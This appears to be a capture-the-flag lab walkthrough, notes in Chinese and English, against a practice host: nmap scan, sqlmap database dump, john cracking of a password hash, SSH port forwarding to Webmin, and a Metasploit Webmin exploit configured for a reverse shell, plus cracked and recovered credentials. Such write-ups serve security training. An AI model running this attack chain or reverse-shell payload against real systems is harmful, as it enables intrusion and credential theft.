#服务扫描
┌──(root💀kali)-[~]
└─# nmap -sV 10.10.107.45
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-30 06:01 EDT
Nmap scan report for 10.10.107.45
Host is up (0.31s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.61 seconds


#What is the name of the large cartoon avatar holding a sniper on the forum?
谷歌搜索图片：Agent 47

#burpsuite抓包，放到sqlmap上跑，dump出整个数据
sqlmap -r request.txt --dbms=mysql --dump 

Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

[06:43:58] [INFO] table 'db.users' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.107.45/dump/db/users.csv'
[06:43:58] [INFO] fetching columns for table 'post' in database 'db'
[06:43:58] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[06:43:59] [INFO] fetching entries for table 'post' in database 'db'
Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[06:43:59] [INFO] table 'db.post' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.107.45/dump/db/post.csv'
[06:43:59] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.107.45'
[06:43:59] [WARNING] your sqlmap version is outdated

[*] ending @ 06:43:59 /2021-08-30/



#用john破解上面agent47的哈希密码
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256

密码是：videogamer124



#转发
ssh -L 10000:localhost:10000 agent47@10.10.27.20

#本地访问
http://localhost:10000

#web登录密码也是
agent47：videogamer124


#msf 提权
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  videogamer124    yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     10000            yes       The target port (TCP)
   SSL       false            yes       Use SSL
   USERNAME  agent47          yes       Webmin Username
   VHOST                      no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580


msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set lhost tun0
lhost => 10.13.21.169
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run




#数据库密码
/var/www/html/index.php 
root:3kSMMS47qZEBgFUe